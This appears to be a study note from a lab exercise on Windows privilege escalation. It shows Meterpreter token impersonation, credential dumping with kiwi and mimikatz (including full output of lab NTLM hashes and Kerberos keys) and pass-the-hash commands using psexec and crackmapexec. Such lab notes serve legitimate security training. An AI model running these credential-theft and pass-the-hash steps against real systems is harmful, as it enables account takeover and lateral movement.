# **Windows Privilege Escalation**

To impersonate tokens in a meterpreter session use:

```
meterpreter > load incognito
Loading extension incognito...Success.
meterpreter > list_tokens -u
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
ATTACKDEFENSE\Administrator
NT AUTHORITY\LOCAL SERVICE

Impersonation Tokens Available
========================================
No tokens available

meterpreter > impersonate_token "ATTACKDEFENSE\Administrator"
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
[+] Delegation token available
[+] Successfully impersonated user ATTACKDEFENSE\Administrator
meterpreter > getuid
Server username: ATTACKDEFENSE\Administrator
```

Using kiwi

```
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.

meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username       Domain         NTLM                              SHA1
--------       ------         ----                              ----
Administrator  ATTACKDEFENSE  e3c61a68f1b89ee6c8ba9507378dc88d  fa62275e30d286c09d30d8fece82664eb34323ef

wdigest credentials
===================

Username        Domain         Password
--------        ------         --------
(null)          (null)         (null)
ATTACKDEFENSE$  WORKGROUP      (null)
Administrator   ATTACKDEFENSE  (null)

kerberos credentials
====================

Username        Domain         Password
--------        ------         --------
(null)          (null)         (null)
Administrator   ATTACKDEFENSE  (null)
attackdefense$  WORKGROUP      (null)

meterpreter > lsa_dump_sam
[+] Running as SYSTEM
[*] Dumping SAM
Domain : ATTACKDEFENSE
SysKey : 377af0de68bdc918d22c57a263d38326
Local SID : S-1-5-21-3688751335-3073641799-161370460

SAMKey : 858f5bda5c99e45094a6a1387241a33d

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: e3c61a68f1b89ee6c8ba9507378dc88d

RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: 58f8e0214224aebc2c5f82fb7cb47ca1

RID  : 000003f0 (1008)
User : student
  Hash NTLM: bd4ca1fbe028f3c5066467a7f6a73b0b

meterpreter > help
...
Kiwi Commands
=============

    Command                Description
    -------                -----------
    creds_all              Retrieve all credentials (parsed)
    creds_kerberos         Retrieve Kerberos creds (parsed)
    creds_livessp          Retrieve Live SSP creds
    creds_msv              Retrieve LM/NTLM creds (parsed)
    creds_ssp              Retrieve SSP creds
    creds_tspkg            Retrieve TsPkg creds (parsed)
    creds_wdigest          Retrieve WDigest creds (parsed)
    dcsync                 Retrieve user account information via DCSync (unparsed)
    dcsync_ntlm            Retrieve user account NTLM hash, SID and RID via DCSync
    golden_ticket_create   Create a golden kerberos ticket
    kerberos_ticket_list   List all kerberos tickets (unparsed)
    kerberos_ticket_purge  Purge any in-use kerberos tickets
    kerberos_ticket_use    Use a kerberos ticket
    kiwi_cmd               Execute an arbitary mimikatz command (unparsed)
    lsa_dump_sam           Dump LSA SAM (unparsed)
    lsa_dump_secrets       Dump LSA secrets (unparsed)
    password_change        Change the password/hash of a user
    wifi_list              List wifi profiles/creds for the current user
    wifi_list_shared       List shared wifi profiles/creds (requires SYSTEM)
```

Using mimikatz binary

```
meterpreter > cd /
meterpreter > mkdir Temp
Creating directory: Temp
meterpreter > cd Temp
meterpreter > upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
[*] uploading  : /usr/share/windows-resources/mimikatz/x64/mimikatz.exe -> mimikatz.exe
[*] Uploaded 1.25 MiB of 1.25 MiB (100.0%): /usr/share/windows-resources/mimikatz/x64/mimikatz.exe -> mimikatz.exe
[*] uploaded   : /usr/share/windows-resources/mimikatz/x64/mimikatz.exe -> mimikatz.exe

meterpreter > shell
Process 4976 created.
Channel 2 created.
Microsoft Windows [Version 10.0.17763.1457]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Temp>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9E32-0E96

 Directory of C:\Temp

12/16/2023  03:47 AM    <DIR>          .
12/16/2023  03:47 AM    <DIR>          ..
12/16/2023  03:47 AM         1,309,448 mimikatz.exe
               1 File(s)      1,309,448 bytes
               2 Dir(s)  15,807,373,312 bytes free

C:\Temp>.\mimikatz.exe
.\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # lsadump::sam
Domain : ATTACKDEFENSE
SysKey : 377af0de68bdc918d22c57a263d38326
Local SID : S-1-5-21-3688751335-3073641799-161370460

SAMKey : 858f5bda5c99e45094a6a1387241a33d

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: e3c61a68f1b89ee6c8ba9507378dc88d

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : ed1f5e64aad3727f03522bbddc080d77

* Primary:Kerberos-Newer-Keys *
    Default Salt : ATTACKDEFENSEAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : f566d48c0c62f88d997e9e56b52eed1696aead09df3100982bcfc5920655da5d
      aes128_hmac       (4096) : bf0ca9e206e82ce481c818070bef0855
      des_cbc_md5       (4096) : 6d570d08df8979fe
    OldCredentials
      aes256_hmac       (4096) : 69d101a02f3f4648bf9875f10c1cd268d3f500c3253ab862222a9e1bb3740247
      aes128_hmac       (4096) : 3c3fd899f7f004ed44e9e48f868a5ddc
      des_cbc_md5       (4096) : 9b808fb9e0cbb3b5
    OlderCredentials
      aes256_hmac       (4096) : 4cbbe8ad8482ca76952b08cd9103ba91af35c9d8b21a3d49c332e072618a9fa9
      aes128_hmac       (4096) : b18addd75f8a2b106b262c7b5e517623
      des_cbc_md5       (4096) : 7fe0c2a15eb32fcd

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : ATTACKDEFENSEAdministrator
    Credentials
      des_cbc_md5       : 6d570d08df8979fe
    OldCredentials
      des_cbc_md5       : 9b808fb9e0cbb3b5

RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: 58f8e0214224aebc2c5f82fb7cb47ca1

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : a1528cd40d99e5dfa9fa0809af998696

* Primary:Kerberos-Newer-Keys *
    Default Salt : WDAGUtilityAccount
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 3ff137e53cac32e3e3857dc89b725fd62ae4eee729c1c5c077e54e5882d8bd55
      aes128_hmac       (4096) : 15ac5054635c97d02c174ee3aa672227
      des_cbc_md5       (4096) : ce9b2cabd55df4ce

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WDAGUtilityAccount
    Credentials
      des_cbc_md5       : ce9b2cabd55df4ce

RID  : 000003f0 (1008)
User : student
  Hash NTLM: bd4ca1fbe028f3c5066467a7f6a73b0b

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : b8e5edf45f3a42335f1f4906a24a08fe

* Primary:Kerberos-Newer-Keys *
    Default Salt : EC2AMAZ-R69684Tstudent
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : bab064fdaf62216a1577f1d5cd88e162f6962b4a421d199adf4c66b61ec6ac7c
      aes128_hmac       (4096) : 42bc1d17d1236d3afc09efbeba547d2c
      des_cbc_md5       (4096) : 1a975b02a7bf15d5

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : EC2AMAZ-R69684Tstudent
    Credentials
      des_cbc_md5       : 1a975b02a7bf15d5

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 2452202 (00000000:00256aea)
Session           : Interactive from 3
User Name         : UMFD-3
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 12/16/2023 3:34:40 AM
SID               : S-1-5-96-0-3
    msv :   
    tspkg : 
    wdigest :   
     * Username : ATTACKDEFENSE$
     * Domain   : WORKGROUP
     * Password : (null)
    kerberos :  
    ssp :   
    credman :   

Authentication Id : 0 ; 174398 (00000000:0002a93e)
Session           : Interactive from 1
User Name         : Administrator
Domain            : ATTACKDEFENSE
Logon Server      : ATTACKDEFENSE
Logon Time        : 12/16/2023 3:32:25 AM
SID               : S-1-5-21-3688751335-3073641799-161370460-500
    msv :   
     [00000003] Primary
     * Username : Administrator
     * Domain   : ATTACKDEFENSE
     * NTLM     : e3c61a68f1b89ee6c8ba9507378dc88d
     * SHA1     : fa62275e30d286c09d30d8fece82664eb34323ef
    tspkg : 
    wdigest :   
     * Username : Administrator
     * Domain   : ATTACKDEFENSE
     * Password : (null)
    kerberos :  
     * Username : Administrator
     * Domain   : ATTACKDEFENSE
     * Password : (null)
    ssp :   
    credman :   

Authentication Id : 0 ; 62274 (00000000:0000f342)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 12/16/2023 3:32:16 AM
SID               : S-1-5-90-0-1
    msv :   
    tspkg : 
    wdigest :   
     * Username : ATTACKDEFENSE$
     * Domain   : WORKGROUP
     * Password : (null)
    kerberos :  
    ssp :   
    credman :   

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : ATTACKDEFENSE$
Domain            : WORKGROUP
Logon Server      : (null)
Logon Time        : 12/16/2023 3:32:16 AM
SID               : S-1-5-20
    msv :   
    tspkg : 
    wdigest :   
     * Username : ATTACKDEFENSE$
     * Domain   : WORKGROUP
     * Password : (null)
    kerberos :  
     * Username : attackdefense$
     * Domain   : WORKGROUP
     * Password : (null)
    ssp :   
    credman :   

Authentication Id : 0 ; 33303 (00000000:00008217)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 12/16/2023 3:32:15 AM
SID               : S-1-5-96-0-0
    msv :   
    tspkg : 
    wdigest :   
     * Username : ATTACKDEFENSE$
     * Domain   : WORKGROUP
     * Password : (null)
    kerberos :  
    ssp :   
    credman :   

Authentication Id : 0 ; 32297 (00000000:00007e29)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 12/16/2023 3:32:15 AM
SID               : 
    msv :   
    tspkg : 
    wdigest :   
    kerberos :  
    ssp :   
    credman :   

Authentication Id : 0 ; 2457520 (00000000:00257fb0)
Session           : Interactive from 3
User Name         : DWM-3
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 12/16/2023 3:34:40 AM
SID               : S-1-5-90-0-3
    msv :   
    tspkg : 
    wdigest :   
     * Username : ATTACKDEFENSE$
     * Domain   : WORKGROUP
     * Password : (null)
    kerberos :  
    ssp :   
    credman :   

Authentication Id : 0 ; 2457323 (00000000:00257eeb)
Session           : Interactive from 3
User Name         : DWM-3
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 12/16/2023 3:34:40 AM
SID               : S-1-5-90-0-3
    msv :   
    tspkg : 
    wdigest :   
     * Username : ATTACKDEFENSE$
     * Domain   : WORKGROUP
     * Password : (null)
    kerberos :  
    ssp :   
    credman :   

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 12/16/2023 3:32:17 AM
SID               : S-1-5-19
    msv :   
    tspkg : 
    wdigest :   
     * Username : (null)
     * Domain   : (null)
     * Password : (null)
    kerberos :  
     * Username : (null)
     * Domain   : (null)
     * Password : (null)
    ssp :   
    credman :   

Authentication Id : 0 ; 62255 (00000000:0000f32f)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 12/16/2023 3:32:16 AM
SID               : S-1-5-90-0-1
    msv :   
    tspkg : 
    wdigest :   
     * Username : ATTACKDEFENSE$
     * Domain   : WORKGROUP
     * Password : (null)
    kerberos :  
    ssp :   
    credman :   

Authentication Id : 0 ; 33334 (00000000:00008236)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 12/16/2023 3:32:15 AM
SID               : S-1-5-96-0-1
    msv :   
    tspkg : 
    wdigest :   
     * Username : ATTACKDEFENSE$
     * Domain   : WORKGROUP
     * Password : (null)
    kerberos :  
    ssp :   
    credman :   

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : ATTACKDEFENSE$
Domain            : WORKGROUP
Logon Server      : (null)
Logon Time        : 12/16/2023 3:32:15 AM
SID               : S-1-5-18
    msv :   
    tspkg : 
    wdigest :   
     * Username : ATTACKDEFENSE$
     * Domain   : WORKGROUP
     * Password : (null)
    kerberos :  
     * Username : attackdefense$
     * Domain   : WORKGROUP
     * Password : (null)
    ssp :   
    credman :
```

Pass the hash attack:

- Metasploit PsExec

```
module exploit/windows/smb/psexec
Paste lm and ntlm hash as SMBPass
set target as Native upload
```

- Crackmapexec

```
crackmapexec smb 10.2.28.132 -u Administrator -H "[NTLM_HASH]" -x "ipconfig"
```
